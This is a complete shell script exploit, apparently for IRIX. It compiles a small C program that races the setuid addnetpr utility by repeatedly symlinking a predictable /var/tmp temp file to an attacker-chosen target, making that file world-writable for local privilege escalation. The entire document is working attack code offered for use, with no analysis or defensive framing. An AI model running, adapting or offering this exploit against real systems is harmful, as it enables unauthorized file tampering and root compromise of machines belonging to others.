#!/bin/sh

PROG="`basename $0`"
if [ $# -ne 1 ]; then
       echo "Usage: $PROG <target>"
       exit 1
fi

cat > expnetpr.c << _CREDIT_TO_ZOMO_
void main(int argc, char *argv[])
{
    char *template = "/var/tmp/printersXXXXXX";
    char *target;
    int pid;

    target = (char *)mktemp(template);

    if ((pid = fork()) > 0) {
            sleep(3);
            umask(0);
            execl("/usr/lib/addnetpr", "addnetpr", "localhost","+", 0);
    }
    else
            while(1) {
                    symlink(argv[1], target);
                    unlink(target);
            }

}
_CREDIT_TO_ZOMO_

/bin/cc expnetpr.c -o expnetpr
if [ ! -f expnetpr ]; then
     echo "Couldn't compile expnetpr.c, lame! \nMake sure that C compiler has been installed from the IDO"
     exit 1
fi

while(`true`)
do
      ./expnetpr $1&
      PID=$!
      sleep 15
      ls -al $1
      killall expnetpr
      killall addnetpr
done
